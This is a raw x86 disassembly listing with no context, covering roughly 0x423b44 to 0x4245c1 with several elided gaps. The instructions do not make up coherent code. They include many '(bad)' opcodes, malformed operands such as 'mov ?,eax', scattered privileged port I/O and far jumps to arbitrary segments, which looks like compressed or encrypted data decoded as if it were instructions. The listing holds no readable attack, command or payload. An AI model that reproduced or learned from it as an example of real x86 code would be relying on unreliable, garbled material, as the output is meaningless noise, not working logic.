  423b44:	cdq    
  423b45:	jl     0x423b21
  423b47:	push   ss
  423b48:	in     al,0xe0
  423b4a:	fstp   DWORD PTR ds:0x2397e466
  423b50:	cmp    DWORD PTR [ecx-0x1],esp
  423b53:	mov    bh,0x4d
  423b55:	xor    eax,0xba707b8c
  423b5a:	cmp    eax,0x73c637f4
  423b5f:	adc    eax,0xa00b9169
  423b64:	aad    0x21
  423b66:	rol    BYTE PTR [ebp+0x30],1
  423b69:	pop    ebp
  423b6a:	mov    edx,DWORD PTR [edi-0x62526775]
  423b70:	adc    cl,BYTE PTR [ecx]
  423b72:	jo     0x423b04
  423b74:	mov    dl,0x51
  423b76:	mov    esi,0xa31d134f
  423b7b:	jne    0x423b11
  423b7d:	ds ret 
  423b7f:	adc    edi,DWORD PTR [eax+0x53]
  423b82:	pop    ecx
  423b83:	stos   DWORD PTR es:[edi],eax
  423b84:	(bad)  
  423b85:	pop    ecx
  423b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b87:	gs (bad) 
  423b89:	mov    edx,0xffc8b907
  423b8e:	and    eax,0x2d19b0d1
  423b93:	std    
  423b94:	(bad)  
  423b95:	xchg   esi,eax
  423b96:	jle    0x423b83
  423b98:	dec    esi
  423b99:	mov    esp,0x4a261dd8
  423b9e:	inc    ebp
  423b9f:	and    dh,BYTE PTR [ebx-0x9]
  423ba2:	or     DWORD PTR [eax+0x1b1cd6ab],esp
  423ba8:	test   BYTE PTR [ecx+ecx*2+0x58],dh
  423bac:	sbb    ecx,DWORD PTR [ebp-0x29]
  423baf:	jb     0x423c26
  423bb1:	cmp    al,0xa1
  423bb3:	div    DWORD PTR [ecx-0x51988b3d]
  423bb9:	mov    edi,0x5b1aae46
  423bbe:	lea    esp,[eax+0x36b22376]
  423bc4:	pop    edi
  423bc5:	mov    DWORD PTR [ecx-0x27],edi
  423bc8:	popa   
  423bc9:	and    esp,esp
  423bcb:	paddsw mm1,QWORD PTR [ebx+0x31]
  423bcf:	add    al,0x15
  423bd1:	das    
  423bd2:	jnp    0x423b6b
  423bd4:	lods   al,BYTE PTR ds:[esi]
  423bd5:	mov    bl,0xaf
  423bd7:	imul   edx,DWORD PTR [eax+0x5],0x6d
  423bdb:	shl    BYTE PTR [edi],0x6c
  423bde:	and    BYTE PTR [ecx],bh
  423be0:	sub    BYTE PTR [edx-0x3c41be1a],ch
  423be6:	test   eax,0x80717f5b
  423beb:	rcr    edx,1
  423bed:	mov    ds:0x63131520,al
  423bf2:	popf   
  423bf3:	push   0x447278d0
  423bf8:	cmp    BYTE PTR [ebx-0x3f],cl
  423bfb:	loop   0x423c48
  423bfd:	out    0xd2,al
  423bff:	sahf   
  423c00:	dec    esp
  423c01:	in     eax,dx
  423c02:	mov    eax,0x9dae4f97
  423c07:	cmp    eax,0x5bcd063e
  423c0c:	jmp    0x423c69
  423c0e:	shr    BYTE PTR [edx],0xd
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x73446617]
  423c81:	cmp    al,0xa2
  423c83:	(bad)  
  423c84:	sub    DWORD PTR [esi+0x1],edi
  423c87:	add    BYTE PTR ds:0x2e000001,al
  423c8d:	jge    0x423ca6
  423c8f:	or     ch,BYTE PTR [esi+0x70]
  423c92:	or     BYTE PTR [esi-0x3b63c2c5],0x49
  423c99:	adc    DWORD PTR [ebp-0xf],ecx
  423c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c9d:	ss loop 0x423c5c
  423ca0:	(bad)  
  423ca2:	or     al,0x49
  423ca4:	sbb    ebp,ecx
  423ca6:	pop    ss
  423ca7:	and    al,0x97
  423ca9:	cmc    
  423caa:	xor    bl,BYTE PTR ds:0x4990910
  423cb0:	retf   
  423cb1:	clc    
  423cb2:	dec    esi
  423cb3:	sbb    al,0x8f
  423cb5:	scas   eax,DWORD PTR es:[edi]
  423cb6:	lods   eax,DWORD PTR ds:[esi]
  423cb7:	push   0x24
  423cb9:	lea    eax,[ebp+0x5fea1598]
  423cbf:	out    dx,eax
  423cc0:	scas   eax,DWORD PTR es:[edi]
  423cc1:	scas   al,BYTE PTR es:[edi]
  423cc2:	pop    eax
  423cc3:	and    al,0xcd
  423cc5:	je     0x423c84
  423cc7:	mov    cs,WORD PTR [ebp-0x25a949e2]
  423ccd:	sub    DWORD PTR [edi-0x5861516b],esi
  423cd3:	push   ebp
  423cd4:	ret    
  423cd5:	mov    ds:0x11084406,al
  423cda:	cmp    ecx,DWORD PTR [edx+0x66]
  423cdd:	rcr    esi,0x67
  423ce0:	adc    dh,ah
  423ce2:	mov    ebx,0x4e72bba8
  423ce7:	dec    ecx
  423ce8:	mov    esp,DWORD PTR [ebx+ecx*8-0x4dd86c3f]
  423cef:	sub    bh,ch
  423cf1:	mov    ds:0x4f598ea4,eax
  423cf6:	dec    edx
  423cf7:	adc    BYTE PTR [esi],ah
  423cf9:	int3   
  423cfa:	jp     0x423cbd
  423cfc:	adc    bh,al
  423cfe:	stos   BYTE PTR es:[edi],al
  423cff:	in     al,dx
  423d00:	outs   dx,BYTE PTR ds:[esi]
  423d01:	sub    ecx,esp
  423d03:	dec    edi
  423d04:	mov    esp,0x9fbc7a20
  423d09:	pop    ecx
  423d0a:	ins    BYTE PTR es:[edi],dx
  423d0b:	fmul   QWORD PTR [eax-0x5bebc96d]
  423d11:	das    
  423d12:	leave  
  423d13:	xchg   edi,eax
  423d14:	pop    ebp
  423d15:	out    0x8,eax
  423d17:	mov    ch,0xd6
  423d19:	ficom  WORD PTR fs:[ebx+0xc03f313]
  423d20:	sti    
  423d21:	inc    edi
  423d22:	fisubr WORD PTR ds:0xd571a8a1
  423d28:	fsub   DWORD PTR [edi+0x57249ea]
  423d2e:	rcl    BYTE PTR [edx],cl
  423d30:	mov    edi,DWORD PTR [ebx]
  423d32:	ss (bad) 
  423d34:	mov    dh,0xdb
  423d36:	in     al,0xae
  423d38:	pop    edi
  423d39:	ret    0x2341
  423d3c:	push   ds
  423d3d:	or     eax,0x83e22cfa
  423d42:	push   edi
  423d43:	mov    edi,DWORD PTR [edx]
  423d45:	pop    edx
  423d46:	mov    bh,0x65
  423d48:	dec    eax
  423d49:	shl    DWORD PTR [edx+0x630526fa],cl
  423d4f:	stc    
  423d50:	popf   
  423d51:	mov    ds:0x617014b9,eax
  423d56:	mov    esp,0x82d81293
  423d5b:	out    dx,eax
  423d5c:	xchg   edi,eax
  423d5d:	adc    DWORD PTR [eax+eiz*2],ebp
  423d60:	xchg   esi,eax
  423d61:	or     al,BYTE PTR [ebp+edi*1-0x171f2d0e]
  423d68:	lods   al,BYTE PTR ds:[esi]
  423d69:	pop    ebx
  423d6a:	mov    eax,0x12cb03a7
  423d6f:	imul   esi,DWORD PTR [ebp-0x5f],0x75
  423d73:	xlat   BYTE PTR ds:[ebx]
  423d74:	mov    bh,0x47
  423d76:	lods   eax,DWORD PTR ds:[esi]
  423d77:	xchg   edx,eax
  423d78:	mov    ebp,edx
  423d7a:	ins    BYTE PTR es:[edi],dx
  423d7b:	fidivr WORD PTR [ebx]
  423d7d:	hlt    
  423d7e:	inc    ecx
  423d7f:	popf   
  423d80:	loope  0x423d1c
  423d82:	cmp    BYTE PTR [ebp-0x27],0x18
  423d86:	cmp    al,0xa2
  423d88:	mov    esi,0xc01b7d51
  423d8d:	aad    0x75
  423d8f:	and    ebx,DWORD PTR [esi+0x0]
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax-0x6a01ec2e],esp
  423e03:	mov    ebp,DWORD PTR [esi]
  423e05:	jg     0x423e08
  423e07:	add    BYTE PTR ds:0x3e000001,al
  423e0d:	cmp    esi,edi
  423e0f:	cmp    edi,edx
  423e11:	pop    ss
  423e12:	fwait
  423e13:	imul   eax,DWORD PTR [ebp-0x4f],0xb
  423e17:	push   edi
  423e18:	test   edx,esp
  423e1a:	mov    esi,0x23bb5b0f
  423e1f:	sub    ebp,DWORD PTR [edx]
  423e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e22:	dec    esi
  423e23:	jne    0x423e01
  423e25:	hlt    
  423e26:	aam    0x65
  423e28:	out    0xcd,al
  423e2a:	leave  
  423e2b:	aas    
  423e2c:	jno    0x423ea7
  423e2e:	sub    al,0x56
  423e30:	pop    esp
  423e31:	add    al,0x81
  423e33:	popa   
  423e34:	mov    al,ds:0x8ebfe2ea
  423e39:	mov    esp,0x44f0dc9c
  423e3e:	mov    ecx,fs
  423e40:	ret    
  423e41:	dec    eax
  423e42:	jne    0x423e78
  423e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e45:	loopne 0x423e91
  423e47:	fbld   TBYTE PTR [edx]
  423e49:	adc    edi,DWORD PTR [edi+0xac5ade8]
  423e4f:	or     esp,DWORD PTR [edx-0x3c424232]
  423e55:	mov    edi,0x80ed063c
  423e5a:	loope  0x423ea1
  423e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e5d:	jb     0x423e29
  423e5f:	and    eax,0x1688dc7c
  423e64:	pop    ss
  423e65:	iret   
  423e66:	cs mov al,0x77
  423e69:	mov    ebp,DWORD PTR ds:0xfe8d213a
  423e6f:	cwde   
  423e70:	mov    bl,0x3c
  423e72:	test   al,0x35
  423e74:	push   es
  423e75:	sub    eax,0xd728f0e5
  423e7a:	stos   BYTE PTR es:[edi],al
  423e7b:	xchg   edi,eax
  423e7c:	(bad)  
  423e7e:	test   DWORD PTR [ecx],0xecd647e8
  423e84:	push   ebp
  423e85:	repnz jmp 0xf592:0x1ad52bf5
  423e8d:	or     ebp,edx
  423e8f:	iret   
  423e90:	sbb    cl,dl
  423e92:	les    edx,FWORD PTR ds:0x6fcc4127
  423e98:	mov    eax,ds:0x6d43fbd3
  423e9d:	or     ah,BYTE PTR [edi+0x7e]
  423ea0:	test   bh,dh
  423ea2:	loopne 0x423e65
  423ea4:	fs test eax,0xc6221792
  423eaa:	lahf   
  423eab:	mov    ah,0x92
  423ead:	sub    eax,DWORD PTR [eax]
  423eaf:	pusha  
  423eb0:	addr16 aad 0x6e
  423eb3:	pop    ebx
  423eb4:	pop    ebp
  423eb5:	arpl   WORD PTR [esp+esi*2-0x6a1cad27],si
  423ebc:	xor    eax,edx
  423ebe:	xor    BYTE PTR [esi],bl
  423ec0:	sbb    eax,DWORD PTR [edx+0x59]
  423ec3:	fwait
  423ec4:	jb     0x423e67
  423ec6:	fsubr  st,st(7)
  423ec8:	inc    DWORD PTR [esi+edx*1-0x6a069f06]
  423ecf:	or     al,0xc2
  423ed1:	imul   esi,edx,0xffffffd0
  423ed4:	add    bl,bl
  423ed6:	mov    ecx,0x33280d34
  423edb:	add    ebx,DWORD PTR ds:0x861e9300
  423ee1:	or     eax,DWORD PTR [ebx]
  423ee3:	stc    
  423ee4:	push   es
  423ee5:	bound  ecx,QWORD PTR [eax]
  423ee7:	jl     0x423f3b
  423ee9:	imul   edx,edi,0x48b5b673
  423eef:	mov    esp,0x1c0cdbe8
  423ef4:	fcmovnbe st,st(6)
  423ef6:	std    
  423ef7:	add    DWORD PTR [edx-0x7fb38671],esp
  423efd:	push   ecx
  423efe:	jnp    0x423f52
  423f00:	xchg   esi,eax
  423f01:	popa   
  423f02:	repnz aad 0xe5
  423f05:	cld    
  423f06:	fucomip st,st(2)
  423f08:	pop    ss
  423f09:	jg     0x423eed
  423f0b:	inc    esp
  423f0c:	adc    ebx,ecx
  423f0e:	add    al,0xd0
  423f10:	imul   eax,DWORD PTR [eax],0x0
	...
  423f72:	add    BYTE PTR [eax],al
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	pusha  
  423f81:	jae    0x423fb6
  423f83:	shl    BYTE PTR [ebx],0x80
  423f86:	add    DWORD PTR [eax],eax
  423f88:	add    eax,0x6c000001
  423f8d:	cli    
  423f8e:	cli    
  423f8f:	ror    BYTE PTR [ebx+esi*4],0x87
  423f93:	add    dl,BYTE PTR [edx-0x36]
  423f96:	outs   dx,DWORD PTR ds:[esi]
  423f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f98:	or     cl,ah
  423f9a:	les    eax,FWORD PTR [ecx]
  423f9c:	loopne 0x423feb
  423f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f9f:	sbb    eax,0x468995b2
  423fa4:	adc    al,0x45
  423fa6:	jnp    0x423f2c
  423fa8:	or     ch,al
  423faa:	push   esp
  423fab:	ret    0xde74
  423fae:	push   edx
  423faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fb0:	outs   dx,DWORD PTR ds:[esi]
  423fb1:	dec    ecx
  423fb2:	add    bl,BYTE PTR [edx+0x127cad7f]
  423fb8:	sub    eax,0x32369047
  423fbd:	js     0x423f7e
  423fbf:	out    dx,eax
  423fc0:	jp     0x424015
  423fc2:	enter  0xeb91,0x9a
  423fc6:	cmp    BYTE PTR [edi-0x4567440a],cl
  423fcc:	cmp    al,0x2a
  423fce:	mov    ebx,0x9824868d
  423fd3:	sbb    DWORD PTR [esi],edx
  423fd5:	retf   
  423fd6:	test   eax,0x174fe732
  423fdb:	xchg   ebp,eax
  423fdc:	inc    esp
  423fdd:	push   0xf969b39c
  423fe2:	or     DWORD PTR [esi],ecx
  423fe4:	call   0xdde399af
  423fe9:	fs pop ecx
  423feb:	mov    esi,DWORD PTR [edx+eax*2-0x74fabc48]
  423ff2:	cmp    BYTE PTR [edi+0x3],bh
  423ff5:	adc    DWORD PTR [ecx],ebx
  423ff7:	mov    dl,0x1c
  423ff9:	jecxz  0x424062
  423ffb:	ins    DWORD PTR es:[edi],dx
  423ffc:	popa   
  423ffd:	push   cs
  423ffe:	call   0x4be4:0x15eeb45c
  424005:	mov    edi,0xff503f49
  42400a:	push   edx
  42400b:	idiv   BYTE PTR [ecx-0x7a]
  42400e:	pop    esi
  42400f:	adc    esp,ebp
  424011:	mov    BYTE PTR [edi-0x79fc41b4],0xb6
  424018:	or     ebx,esi
  42401a:	imul   ecx,DWORD PTR [esi-0x2fd79cde],0x7d
  424021:	sub    DWORD PTR [esi+0x715d85f1],edi
  424027:	mov    eax,edi
  424029:	push   edi
  42402a:	fwait
  42402b:	jo     0x424081
  42402d:	mov    ?,eax
  42402f:	mov    ebp,0xe8d91be3
  424034:	push   cs
  424035:	push   ebx
  424036:	bound  edx,QWORD PTR [esi+0x69792639]
  42403c:	or     dh,BYTE PTR [ebp-0x2a2d8f83]
  424042:	not    DWORD PTR [ebp+edi*2-0x31]
  424046:	xchg   ecx,eax
  424047:	out    dx,eax
  424048:	test   eax,0xb568a34d
  42404d:	test   al,0xeb
  42404f:	fucompp 
  424051:	rol    BYTE PTR [ebx-0x2ea15124],cl
  424057:	inc    eax
  424058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424059:	push   es
  42405a:	and    DWORD PTR [bp-0x3876],ebp
  42405f:	jmp    0x4293:0xcb2b9f00
  424066:	cmc    
  424067:	and    eax,0x3c8e63ba
  42406c:	inc    ebp
  42406d:	icebp  
  42406e:	gs loop 0x424050
  424071:	stos   BYTE PTR es:[edi],al
  424072:	call   0x34ff8b1e
  424077:	mov    ds:0x9234ea8c,eax
  42407c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42407d:	(bad)  
  42407e:	call   0x8d331ebb
  424083:	inc    ebp
  424084:	push   ebp
  424085:	mov    eax,ds:0xc7ec9a99
  42408a:	sbb    ah,BYTE PTR [ebx+0x5f]
  42408d:	leave  
  42408e:	stos   DWORD PTR es:[edi],eax
  42408f:	adc    eax,0xbe
	...
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	xchg   ebx,eax
  424101:	xor    bl,ch
  424103:	jmp    0x105:0x18138
  42410a:	add    BYTE PTR [eax],al
  42410c:	push   0x72ee936b
  424111:	inc    ebp
  424112:	add    ch,bh
  424114:	jbe    0x4240ea
  424116:	daa    
  424117:	adc    eax,0x62ad43ac
  42411c:	cmp    cl,BYTE PTR [edi]
  42411e:	add    eax,0x5493e15d
  424123:	ins    DWORD PTR es:[edi],dx
  424124:	mov    BYTE PTR ds:0xd8fb34a4,0xb
  42412b:	jbe    0x4241a8
  42412d:	mov    DWORD PTR [ebp+0x12],esi
  424130:	(bad)  
  424131:	fisubr DWORD PTR [esi+0x3ebd9f6]
  424137:	icebp  
  424138:	mov    bl,0xb2
  42413a:	dec    esi
  42413b:	mov    ss,edx
  42413d:	xchg   ebp,eax
  42413e:	xchg   ecx,eax
  42413f:	jecxz  0x424104
  424141:	xlat   BYTE PTR ds:[ebx]
  424142:	dec    ebx
  424143:	jecxz  0x424117
  424145:	loopne 0x424192
  424147:	out    dx,eax
  424148:	js     0x4240cb
  42414a:	rcr    DWORD PTR [edi-0x3db4b0ee],cl
  424150:	mov    WORD PTR [ebp-0x461ec60b],gs
  424156:	fisubr WORD PTR [edi+0x49be5f79]
  42415c:	push   DWORD PTR [edx-0x3846f1f5]
  424162:	push   es
  424163:	repnz pop ds
  424165:	ss (bad) 
  424167:	push   0xffffff88
  424169:	int3   
  42416a:	out    0x4,eax
  42416c:	or     edx,DWORD PTR [ebp+0x797a6480]
  424172:	(bad)  
  424174:	out    0x48,al
  424176:	das    
  424177:	ret    
  424178:	mov    ebp,0xec78e1bc
  42417d:	fld    QWORD PTR [ebx-0x57]
  424180:	retf   0x3e2b
  424183:	js     0x4241eb
  424185:	xor    dl,BYTE PTR [edx+0x64ffd0c0]
  42418b:	ror    BYTE PTR [esi+ebp*1+0x7d],cl
  42418f:	les    esi,FWORD PTR [esi-0x7d]
  424192:	mov    ebx,0xe471360e
  424197:	out    dx,al
  424198:	add    cl,BYTE PTR [ebx+0x5010ebdf]
  42419e:	jle    0x42414e
  4241a0:	inc    ebx
  4241a1:	adc    al,BYTE PTR [ecx]
  4241a3:	mov    al,0x21
  4241a5:	repz rcr DWORD PTR [ebx],0xdd
  4241a9:	mov    ax,ds:0xba2b4c94
  4241af:	scas   eax,DWORD PTR es:[edi]
  4241b0:	pop    ebp
  4241b1:	in     eax,dx
  4241b2:	pop    esp
  4241b3:	adc    ch,BYTE PTR [edx+ecx*1]
  4241b6:	sub    al,0x27
  4241b8:	fwait
  4241b9:	inc    ebx
  4241ba:	pusha  
  4241bb:	test   dh,dl
  4241bd:	fldlg2 
  4241bf:	lgs    edx,FWORD PTR [ebx+ecx*1]
  4241c3:	mov    ch,0x81
  4241c5:	loope  0x4241d8
  4241c7:	fcomp  DWORD PTR [esi+eiz*2]
  4241ca:	cmp    eax,0xa5529176
  4241cf:	out    dx,eax
  4241d0:	out    0x3d,al
  4241d2:	cmp    ebx,DWORD PTR [ecx+0x5fe57010]
  4241d8:	xor    BYTE PTR [edi],ch
  4241da:	loope  0x42418b
  4241dc:	jp     0x42424f
  4241de:	scas   eax,DWORD PTR es:[edi]
  4241df:	xor    esp,edi
  4241e1:	sar    BYTE PTR [eax+0x7],cl
  4241e4:	ss lahf 
  4241e6:	sub    al,0x2e
  4241e8:	dec    esp
  4241e9:	ret    0x4260
  4241ec:	or     esp,DWORD PTR [ebx+0x8]
  4241ef:	nop
  4241f0:	lea    eax,[eax]
  4241f2:	mov    ?,WORD PTR [edx+0x60bec3d3]
  4241f8:	pop    es
  4241f9:	sbb    eax,0xc2665ed7
  4241fe:	imul   edi,DWORD PTR [edx-0x46637a86],0x3e334b56
  424208:	sahf   
  424209:	test   esp,edx
  42420b:	inc    eax
  42420c:	and    BYTE PTR [ecx+0x71e609],0x0
	...
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	cdq    
  424281:	call   0x827facde
  424286:	add    DWORD PTR [eax],eax
  424288:	add    eax,0xce000001
  42428d:	xor    edx,edi
  42428f:	jg     0x4242c0
  424291:	lods   eax,DWORD PTR ds:[esi]
  424292:	fcomp  DWORD PTR [ebp-0x7c76d374]
  424298:	pop    ds
  424299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42429a:	mov    ah,0x91
  42429c:	sbb    DWORD PTR [ebx],edx
  42429e:	imul   ecx,DWORD PTR [ecx],0xa5a8e53a
  4242a4:	or     edx,0x7f
  4242a7:	jmp    0xae4a5728
  4242ac:	inc    ebx
  4242ad:	jne    0x424299
  4242af:	(bad)  
  4242b0:	(bad)  
  4242b1:	addr16 dec eax
  4242b3:	shl    BYTE PTR [edi+edx*4-0x29],0xd3
  4242b8:	fwait
  4242b9:	xchg   ebp,eax
  4242ba:	or     DWORD PTR [esi],0x61ea1d07
  4242c0:	cmp    ah,ch
  4242c2:	jp     0x424332
  4242c4:	inc    esp
  4242c5:	loop   0x42433c
  4242c7:	mov    edx,0x7c1a8488
  4242cc:	jl     0x4242bd
  4242ce:	xor    eax,0xe3d4a950
  4242d3:	mov    bl,dh
  4242d5:	test   eax,0xf46c4f86
  4242da:	daa    
  4242db:	and    WORD PTR ds:0x6268a9ce,di
  4242e2:	pop    edi
  4242e3:	cli    
  4242e4:	sbb    BYTE PTR [edx+0x2d9feb62],al
  4242ea:	js     0x42433d
  4242ec:	popf   
  4242ed:	fsub   QWORD PTR [esi+0x2ff1eaa0]
  4242f3:	sbb    esp,DWORD PTR [ecx+edi*8-0x7641e0f]
  4242fa:	dec    esp
  4242fb:	cmp    dh,bl
  4242fd:	mov    ch,0xc2
  4242ff:	add    eax,0xb041c86c
  424304:	rcl    BYTE PTR [esi],cl
  424306:	lock pop edi
  424308:	fcom   DWORD PTR [edi]
  42430a:	lea    ecx,[esi-0x21]
  42430d:	(bad)  
  42430e:	jnp    0x4242ea
  424310:	mov    cl,0xe0
  424312:	test   al,0xa9
  424314:	cli    
  424315:	inc    edx
  424316:	or     al,0x20
  424318:	push   0xffffffa7
  42431a:	fdiv   QWORD PTR [edi-0x51]
  42431d:	rcl    BYTE PTR [edx],cl
  42431f:	cs xor al,0x2f
  424322:	dec    edi
  424323:	(bad)
  424327:	xor    DWORD PTR [edi+0x45],ebx
  42432a:	mov    eax,0x10d6b615
  42432f:	add    DWORD PTR [eax],esp
  424331:	rol    DWORD PTR [eax+0x29],0x0
  424335:	jle    0x42439f
  424337:	ja     0x4242c8
  424339:	cmc    
  42433a:	outs   dx,DWORD PTR ds:[esi]
  42433b:	sbb    edx,eax
  42433d:	mov    cs,WORD PTR [ebp-0x3f38487e]
  424343:	jp     0x4242ff
  424345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424346:	mov    ch,dh
  424348:	in     al,dx
  424349:	xor    BYTE PTR [ebx],dl
  42434b:	cli    
  42434c:	ins    BYTE PTR es:[edi],dx
  42434d:	int    0x35
  42434f:	in     al,0x46
  424351:	jnp    0x42433e
  424353:	xor    eax,0xa06322d
  424358:	(bad)  
  42435a:	les    eax,FWORD PTR [ebp+0x6b]
  42435d:	call   FWORD PTR [ecx+0x1]
  424360:	mov    ebp,0x88761157
  424365:	pop    ss
  424366:	dec    esp
  424367:	or     DWORD PTR [ebp+0x5f3f0404],0x5737df3a
  424371:	jo     0x4242fb
  424373:	mov    ds:0xe59da48d,eax
  424378:	aas    
  424379:	ins    BYTE PTR es:[edi],dx
  42437a:	mov    dl,0x13
  42437c:	cmp    al,0x3b
  42437e:	or     BYTE PTR [esi-0x40cbd986],al
  424384:	sbb    al,0x42
  424386:	mov    ebp,0x434ade65
  42438b:	pop    edi
  42438c:	cli    
  42438d:	or     al,0x96
  42438f:	dec    edx
  424390:	in     eax,dx
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x42444e
  424401:	(bad)  
  424402:	push   ss
  424403:	stc    
  424404:	inc    edx
  424405:	add    DWORD PTR [ecx],0x0
  424408:	add    eax,0x10000001
  42440d:	adc    esp,ecx
  42440f:	out    dx,al
  424410:	jnp    0x4243ce
  424412:	xor    edx,ecx
  424414:	cmp    al,0x60
  424416:	inc    eax
  424417:	call   0xd811:0x52d7f78d
  42441e:	pushf  
  42441f:	xlat   BYTE PTR ds:[ebx]
  424420:	jmp    0x4243ec
  424422:	push   ebp
  424423:	sbb    al,0xc9
  424425:	into   
  424426:	dec    ebx
  424427:	repz loop 0x424419
  42442a:	rcl    ebx,cl
  42442c:	adc    al,0x9
  42442e:	mov    al,0xb3
  424430:	xchg   BYTE PTR [ebx-0xb],cl
  424433:	stos   BYTE PTR es:[edi],al
  424434:	xor    al,0xe9
  424436:	mov    BYTE PTR [eax],dh
  424438:	jecxz  0x424401
  42443a:	pop    edi
  42443b:	or     ebp,DWORD PTR [esi]
  42443d:	jmp    DWORD PTR [edi]
  42443f:	sti    
  424440:	push   ebx
  424441:	dec    ebp
  424442:	and    dh,BYTE PTR [edi-0x7f129e0c]
  424448:	push   esi
  424449:	out    dx,al
  42444a:	test   BYTE PTR [esi-0x2],0xf6
  42444e:	xor    bh,BYTE PTR [eax]
  424450:	adc    eax,ebx
  424452:	pop    esi
  424453:	ins    BYTE PTR es:[edi],dx
  424454:	std    
  424455:	es cmp eax,0xbcd174f8
  42445b:	test   al,0x48
  42445d:	aad    0x26
  42445f:	sub    eax,0xe2b6e35d
  424464:	scas   al,BYTE PTR es:[edi]
  424465:	(bad)  
  424466:	jns    0x424488
  424468:	fdivr  st(5),st
  42446a:	xchg   DWORD PTR [esi+0xd],eax
  42446d:	push   ebp
  42446e:	push   edx
  42446f:	jb     0x4244d1
  424471:	add    ecx,DWORD PTR [ebp+ecx*8+0x13f7e970]
  424478:	xchg   cl,bl
  42447a:	xchg   BYTE PTR [bp+si],ah
  42447d:	ja     0x4244a6
  42447f:	xchg   ch,dh
  424481:	mov    esi,DWORD PTR [ebx+ecx*8-0x37dcd5ac]
  424488:	mov    BYTE PTR [edx+eax*8+0x16d59c1c],ch
  42448f:	aas    
  424490:	ins    DWORD PTR es:[edi],dx
  424491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424492:	jg     0x4244e7
  424494:	add    ch,BYTE PTR [edi-0x3100945b]
  42449a:	in     al,dx
  42449b:	fs jge 0x4244ea
  42449e:	and    DWORD PTR [ebx-0x10],ebp
  4244a1:	mov    cl,cl
  4244a3:	retf   0x30a3
  4244a6:	jp     0x4244fa
  4244a8:	leave  
  4244a9:	hlt    
  4244aa:	jno    0x4244da
  4244ac:	(bad)  
  4244ad:	in     al,0x3
  4244af:	jge    0x4244d5
  4244b1:	mov    ds:0x5391a775,eax
  4244b6:	mov    dh,0xa8
  4244b8:	push   eax
  4244b9:	sbb    DWORD PTR ds:0x794d5d20,ebp
  4244bf:	cmp    eax,0xbeeb43d0
  4244c4:	mov    esp,0x70f80c9d
  4244c9:	push   esp
  4244ca:	push   ebx
  4244cb:	ds dec eax
  4244cd:	fisubr WORD PTR [edi-0x3737481c]
  4244d3:	mov    eax,ds:0xae82b92e
  4244d8:	gs pop ss
  4244da:	mov    bl,0x48
  4244dc:	jp     0x4244ac
  4244de:	xor    BYTE PTR [esi+0x2365bffe],bh
  4244e4:	push   0x36
  4244e6:	(bad)  
  4244e7:	addr16 aas 
  4244e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244ea:	mov    ebx,0x5ef8cfe4
  4244ef:	dec    esp
  4244f0:	retf   
  4244f1:	mov    esi,0xd4634bb7
  4244f6:	pop    ebp
  4244f7:	push   ebx
  4244f8:	mov    dh,0xe5
  4244fa:	xchg   ecx,eax
  4244fb:	test   eax,esp
  4244fd:	inc    ebx
  4244fe:	mov    bh,0x91
  424500:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  424502:	sub    DWORD PTR [ebx-0x1f],0xffffffd1
  424506:	dec    esi
  424507:	inc    ebx
  424508:	jmp    0xb3f7b755
  42450d:	or     eax,0x95f8df
	...
  424572:	add    BYTE PTR [eax],al
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x3c],1
  424581:	and    al,0x77
  424583:	ja     0x4245cc
  424585:	test   BYTE PTR [ecx],al
  424587:	add    BYTE PTR ds:0x2f000001,al
  42458d:	mov    ss,WORD PTR [eax+0x7f]
  424590:	sbb    dl,0xd9
  424593:	mov    ds:0xd470b90d,eax
  424598:	enter  0x2f3,0x3d
  42459c:	xor    DWORD PTR [esi+0x4b],esi
  42459f:	or     bl,BYTE PTR [ecx+0x24]
  4245a2:	xor    dh,al
  4245a4:	jl     0x4245fb
  4245a6:	xchg   esp,eax
  4245a7:	xor    eax,0x54fd6639
  4245ac:	fldenv [ebx+eiz*8+0x34]
  4245b0:	mov    esp,0x18fc3f47
  4245b5:	pop    ebp
  4245b6:	mov    edx,eax
  4245b8:	mov    ebx,0x4cc04010
  4245bd:	cwde   
  4245be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245bf:	aam    0xc2
  4245c1:	jge    0x4245b0
